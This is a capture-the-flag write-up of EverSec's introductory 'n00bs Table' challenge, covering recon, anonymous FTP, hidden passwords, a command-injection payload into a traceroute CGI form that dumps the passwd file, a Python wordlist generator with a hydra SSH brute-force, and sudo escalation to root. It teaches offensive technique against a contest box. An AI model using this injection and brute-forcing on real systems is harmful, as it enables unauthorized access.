---
title: "n00bs Table - EverSecCTF"
date: 2025-05-21
draft: false
author: "Jaylan Argo"
tags:
  - CTF
  - EverSec
  - nmap
  - dirb
  - ssh
  - FTP
  - html
  - shell
  - Steganography
  - python
  - Password Cracking
image: /images/posts/n00bsTable - CackalackyCon.jpg
description: "EverSecCTF 2025 Challenge"
toc:
---

## CackalackyCon 2025 - EverSecCTF

I spent this past weekend at CackalackyCon 2025 as a first time attendee, per friend and peer requests. It was an amazing time, but I wanted to try my hand at more CTFs, and EverSec provided this one yet again. I have experienced them at BSides RDU 2023 & 2024, and both were fun and interesting experiences. 
s
This year, me and 3 other peers under Hackpack managed to place <mark>4th</mark> on the leaderboard for the CTF! We managed to complete almost every challenge, but there were a few that stumped us. 

I wanted to take this opportunity to try and make a quick write-up for an introductory-level challenge, <mark>n00bs Table</mark>. This was geared towards entry-level CTF'ers who wanted to dip their toes into the fun activity, and would be a perfect candidate for a quick write up. 

It consists of multiple challenges that compound upon one another, ending in root access on a box. Your team could also rack up a fair bit of points from completing it too (over a fourth of our total points!), so I wanted to venture forth and get some extra points.

<br>

# Challenge(s)

## Initial Recon

### nmap

Ran `$ nmap -A -v 10.1.3.3` to get a lay of the land, followed by `$ nmap -sS -p- 10.1.3.3` to get all the ports. The following ports exist.

```js
PORT        STATE   SERVICE
21/tcp      open    ftp
22/tcp      open    ssh
80/tcp      open    http
9090/tcp    open    zeus-admin
13337/tcp   open    unknown
22222/tcp   open    ssh
```

### dirb

I ran `$ dirb http://10.1.3.3/` to grab endpoints on 10.1.3.3, and got the following:

```yaml
---- Scanning URL: http://10.1.3.3/ ----
+ http://10.1.3.3/cgi-bin/ (CODE:403|SIZE:217)
+ http://10.1.3.3/index.html (CODE:200|SIZE:343)
==> DIRECTORY: http://10.1.3.3/passwords/
+ http://10.1.3.3/robots.txt (CODE:200|SIZE:126)
```

## FTP

Nmap returns port 21 for FTP, essentially suggesting I access their ftp server. I quickly logged in with the following to access the ftp server:

```shhell
USER: ftp
PASS: ftp
```

I ran `$ ls` to see what files exist, and `./FLAG.txt` exists on the server. 

I grab it using `$ get FLAG.txt`, and ran `$ cat FLAG.txt` on my host OS. It gives the following flag.

```js
----------- FLAG -----------
 N0b0dyG3ts7h3Fl4g 
----------------------------
```

## Admin Panel

I get returned the following from port 9090 on the `nmap -A -v` command run:

```js
9090/tcp  open  http    Cockpit web service 161 or earlier
| http-title: localhost.localdomain
|_Requested resource was https://n00bs.eversec-ctf.com:9090/
| http-methods:
|_  Supported Methods: GET HEAD
```

Going to the following website leads me to an admin panel. It possesses a flag in a header on the page, which appears to be its only function.

```js
----------- FLAG -----------
 H1dd3n4dm1n4cc3ss 
----------------------------
```

## /passwords/

From the dirb run, I got the `10.1.3.3/passwords/` endpoint. This leads to a folder with 2 pages within:

```bash
[TXT]	FLAG.txt        2024-05-16 13:32	26
[TXT]	passwords.html  2024-05-16 13:33	355
```

### FLAG.txt

This one straight up includes a flag:

```js
----------- FLAG -----------
 W3bFl4gs1nP4ssw0rds 
----------------------------
```

## Summer/winter

### passwords.html

The `/passwords/passwords.html/` page leads to a page which just contains a couple of sentences. Inspecting the HTML with F12/inspect element leads to a password in the comments:

```html
...
<!--Password: winter-->
...
```

Which is also a flag:

```js
----------- FLAG -----------
 winter 
----------------------------
```

So now, we need a username.

### robots.txt

The `robots.txt` file lists a couple of endpoints under `/cgi-bin/`:

```bash
/cgi-bin/root_shell.cgi
/cgi-bin/tracertool.cgi
/cgi-bin/*
```

We cannot access the base `/cgi-bin/` endpoint, and `/root-shell/` provides no information, but we can access `/cgi-bin/tracertool.cgi`.

### tracertool.cgi

This page contains an input box, asking for an IP address to trace, and we can directly correlate it's output to the direct output of the traceroute command.

<br>

<img src="/posts-content/n00bstable-EverSec2025/tracertool.png" alt="tracertool" style="max-width:35%;height:auto;display:block;margin:auto;" />

<br>

This could allow us to run a command directly in line after the traceroute command. To exploit this, we can send the following:

```js
10.1.3.4 ; getent passwd
```

`&`, `&&`, and `||` did not work, but `;` did. They also modified the cat command to print out a cat directly, so `$ cat /etc/passwd` did not work. But, we can use `$ getent passwd` to grab the passwd file as well to grab users.

This dumps the passwd file, but the most important ones are as follows:

```js
RickSanchez:x:1000:1000::/home/RickSanchez:/bin/bash
Morty:x:1001:1001::/home/Morty:/bin/bash
Summer:x:1002:1002::/home/Summer:/bin/bash
```

We managed to secure a list of users, andI'd imagine that `Summer` would have the `winter` password, so we try that. But how?

### ssh

Turns out that ssh does not work on port 22, as it immediately closes the connection. But, you can find out that port 22222 has ssh open from a full nmap scan of all ports on the machine. So, we try connecting through port 22222.

```bash
ssh Summer@10.1.3.3 -p 22222 
```

Inputting a password of winter works here. 

FLAG.txt exists at the base login as well. Then, with the disabling of cat in mind, running `$ nano FLAG.txt` gives us the flag:

```js
----------- FLAG -----------
 U5erL3v3lSh3llAcc3ss 
----------------------------
```

## Morty & Rick

Exploring the file system leads you to 2 other users' directories, `Morty` and `RickSanchez`. We'll start with Morty.

### Morty's Journal

There are 2 files in the Morty directory. I pulled them over to my machine with Filezilla.

```
journal.txt.zip
Safe_Password.jpg
```

The zip folder is password protected. So, we need a password, which is hopefully in the image. Opening the image itself did not lead to much, just an image of Rick Sanchez. 

<br>

<img src="/posts-content/n00bstable-EverSec2025/Safe_Password.jpg" alt="Safe Password" style="max-width:35%;height:auto;display:block;margin:auto;" />

<br>

But, running `strings` on the jpg leads to the following:

```
The Safe Password: File: /home/Morty/journal.txt.zip. Password: Meeseek
```

So, we open the zip folder with the password `Meeseek`, and the password is in the text file within the folder. This also happens to be a flag.

```js
----------- FLAG -----------
 131333 
----------------------------
```

### Rick's Safe

I found the RickSanchez user folder, and I found the file `/RICKS_SAFE/safe`, which I have the password from previously.

I wasn't able to do much on the remote system, since I don't have execution or modification privileges, so I moved it to my own.

Here, I recognized it as a runnable binary, so I tried running it. It needed execute permissions, so I ran `$ chmod +x ./safe` to get that.

From there, I was met with something promising:

```bash
./safe: error while loading shared libraries: libmcrypt.so.4: cannot open shared object file: No such file or directory
```

So, I was on the right track. I downloaded the library with `$ sudo apt-get install libmcrypt4`, and ran `$ ./safe`. I was greeted with the output:

```
Past Rick to present Rick, tell future Rick to use GOD DAMN COMMAND LINE AAAAAHHAHAGGGGRRGUMENTS!
```

I used the command line argument for the password, and got the following output

```bash
$ ./safe 131333
decrypt:        FLAG{And Awwwaaaaayyyy we Go!} - 20 Points
```

With that, the flag is as follows:

```js
----------- FLAG -----------
 And Awwwaaaaayyyy we Go! 
----------------------------
```

## Rick's Password

Opening the safe gives me this:

```
Ricks password hints:
 (This is incase I forget.. I just hope I don't forget how to write a script to generate potential passwords. Also, sudo is wheely good.)
Follow these clues, in order

1 uppercase character
1 digit
One of the words in my old bands name.
```

So now we need to password crunch.

### Password Cracking

Rick's past band was The Flesh Curtains, and that's the only one we know of. Using this information, we can crack it.

I used the [rickspass.py](./rickspass.py) to generate a wordlist, giving me [rick_passwords.txt](./rick_passwords.txt). 

```python
import string

# Define possible components
uppercase_letters = string.ascii_uppercase  ## 'A' to 'Z'
digits = '0123456789'
band_words = ['The', 'Flesh', 'Curtains']

# Open a file to write the passwords
with open('rick_passwords.txt', 'w') as f:
    for letter in uppercase_letters:
        for digit in digits:
            for word in band_words:
                password = f"{letter}{digit}{word}"
                f.write(password + '\n')

print("Password list generated and saved to rick_passwords.txt")
```

Then I ran the following command to try and brute force the password using hydra.

```bash
hydra -l RickSanchez -P rick_passwords.txt ssh://10.1.3.3:22222 -t 8 -v
```

This gives me a successful message of:

```bash
[22222][ssh] host: 10.1.3.3   login: RickSanchez   password: P7Curtains
```

And now we have the password, which also happens to be a flag:

```js
----------- FLAG -----------
 P7Curtains
----------------------------
```

## Root Time

We can now access the root user with this newfound sudo access. We can log in as Rick using `RickSanchez:P7Curtains` and change to the root user using `$ sudo -s`. 

This gives us root access, and we can go to the root user's home folder to access a flag with `cd ~/`. 

```js
----------- FLAG -----------
 Ionic Defibrillator
----------------------------
```

And that concludes the challenge. 9 flags found for a simple, introductory challenge.

<img src="/posts-content/n00bstable-EverSec2025/n00bs-Table-done.png" alt="Safe Password" style="max-width:50%;height:auto;display:block;margin:auto;" />

<br>

###### Side note: My team found another, 10th flag through SQL injection into the USERS table, but I didn't get enough  time to verify the methods for this writeup.